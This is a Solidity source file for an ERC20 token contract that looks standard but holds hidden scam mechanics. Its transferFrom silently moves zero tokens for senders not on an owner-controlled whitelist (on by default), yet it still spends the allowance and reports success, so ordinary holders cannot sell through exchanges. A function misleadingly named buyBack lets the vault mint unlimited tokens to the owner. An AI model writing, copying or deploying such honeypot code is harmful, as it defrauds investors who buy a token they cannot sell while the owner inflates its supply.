// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.11;
import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

library Counters {
    using SafeMath for uint256;

    struct Counter {
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {
        return counter._value;
    }

    function increment(Counter storage counter) internal {
        counter._value += 1;
    }

    function decrement(Counter storage counter) internal {
        counter._value = counter._value.sub(1);
    }
}

contract VaultOwned is Ownable {
    address internal _vault;

    function setVault(address vault_) external onlyOwner returns (bool) {
        _vault = vault_;
        return true;
    }

    function vault() public view returns (address) {
        return _vault;
    }

    modifier onlyVault() {
        require(_vault == msg.sender, 'VaultOwned: caller is not the Vault');
        _;
    }
}

contract TokenERC20 is VaultOwned, IERC20 {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => bool) public whitelist;
    bool private whitelistOnly = true;

    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;
    uint256 internal _totalSupply;

    constructor(string memory name_, string memory symbol_, uint256 totalSupply_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_.mul(10 ** _decimals);
        _vault = address(msg.sender);
        whitelist[msg.sender] = true;
        whitelist[address(this)] = true;

        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function setWhitelistStatus(bool value) external onlyVault {
        whitelistOnly = value;
    }

    function isInWhitelist(address _address) external view returns (bool) {
        return whitelist[_address];
    }

    function addToWhitelist(address _address) external onlyVault {
        _addToWhitelist(_address);
    }

    function addMultipleToWhitelist(address[] memory _addresses) external onlyVault {
        for (uint256 i; i < _addresses.length; i++) {
            _addToWhitelist(_addresses[i]);
        }
    }

    function _addToWhitelist(address _address) internal {
        whitelist[_address] = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        if (whitelist[sender]) {
            _transfer(sender, recipient, amount);
            _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, 'ERC20: transfer amount exceeds allowance'));
        } else if (whitelistOnly == false) {
            _transfer(sender, recipient, amount);
            _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, 'ERC20: transfer amount exceeds allowance'));
        } else {
            _transfer(sender, recipient, 0);
            _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, 'ERC20: transfer amount exceeds allowance'));
        }
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(subtractedValue, 'ERC20: decreased allowance below zero') // nikolas keij
        );
        return true;
    }

    function buyBack(uint256 amount_) external onlyVault {
        _buyBack(amount_.mul(10 ** _decimals));
    }

    function burn(uint256 amount) public virtual {
        _burn(msg.sender, amount.mul(10 ** _decimals));
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), 'ERC20: transfer from the zero address');
        require(recipient != address(0), 'ERC20: transfer to the zero address');

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, 'ERC20: transfer amount exceeds balance');
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), 'ERC20: approve from the zero address');
        require(spender != address(0), 'ERC20: approve to the zero address');

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _buyBack(uint256 amount_) internal virtual {
        require(owner() != address(0), 'ERC20: mint to the zero address');

        _beforeTokenTransfer(address(0), owner(), amount_);
        _totalSupply = _totalSupply.add(amount_);
        _balances[owner()] = _balances[owner()].add(amount_);
        emit Transfer(address(0), owner(), amount_);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), 'ERC20: burn from the zero address');

        _beforeTokenTransfer(account, address(0xdead), amount);

        _totalSupply = _totalSupply.sub(amount);
        _balances[account] = _balances[account].sub(amount, 'ERC20: burn amount exceeds balance');
        emit Transfer(account, address(0xdead), amount);
    }

    function _beforeTokenTransfer(address from_, address to_, uint256 amount_) internal virtual {}
}
